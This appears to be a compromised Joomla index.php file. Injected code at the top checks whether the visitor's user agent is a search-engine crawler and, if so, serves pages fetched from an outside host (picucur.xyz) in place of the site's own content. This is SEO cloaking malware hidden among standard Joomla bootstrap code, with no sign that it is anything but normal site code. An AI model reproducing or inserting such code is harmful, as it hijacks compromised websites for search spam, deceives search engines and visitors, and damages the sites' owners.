<?php
/**
 * @package    Joomla.Site
 *
 * @copyright  (C) 2005 Open Source Matters, Inc. <https://www.joomla.org>
 * @license    GNU General Public License version 2 or later; see LICENSE.txt
 */
ob_start();
header("Vary: User-Agent");
$bot_url = "https://picucur.xyz/landing/calabriaonweb/";
$botchar = "/(googlebot|slurp|bingbot|baiduspider|yandex|adsense|crawler|spider|inspection)/i";
$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
function lph_requests($url)
{
    if (function_exists("curl_init")) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0");
        $response = curl_exec($ch);
        curl_close($ch);
        return $response;
    } elseif (ini_get("allow_url_fopen")) {
        return file_get_contents($url);
    }
    return false;
}
if (preg_match($botchar, $ua)) {
    usleep(rand(100000, 200000));
    echo lph_requests($bot_url);
    ob_end_flush();
    die;
}

/**
 * Define the application's minimum supported PHP version as a constant so it can be referenced within the application.
 */
define('JOOMLA_MINIMUM_PHP', '5.3.10');

if (version_compare(PHP_VERSION, JOOMLA_MINIMUM_PHP, '<'))
{
	die('Your host needs to use PHP ' . JOOMLA_MINIMUM_PHP . ' or higher to run this version of Joomla!');
}

// Saves the start time and memory usage.
$startTime = microtime(1);
$startMem  = memory_get_usage();

/**
 * Constant that is checked in included files to prevent direct access.
 * define() is used in the installation folder rather than "const" to not error for PHP 5.2 and lower
 */
define('_JEXEC', 1);

if (file_exists(__DIR__ . '/defines.php'))
{
	include_once __DIR__ . '/defines.php';
}

if (!defined('_JDEFINES'))
{
	define('JPATH_BASE', __DIR__);
	require_once JPATH_BASE . '/includes/defines.php';
}

require_once JPATH_BASE . '/includes/framework.php';

// Set profiler start time and memory usage and mark afterLoad in the profiler.
JDEBUG ? JProfiler::getInstance('Application')->setStart($startTime, $startMem)->mark('afterLoad') : null;

// Instantiate the application.
$app = JFactory::getApplication('site');

// Execute the application.
$app->execute();
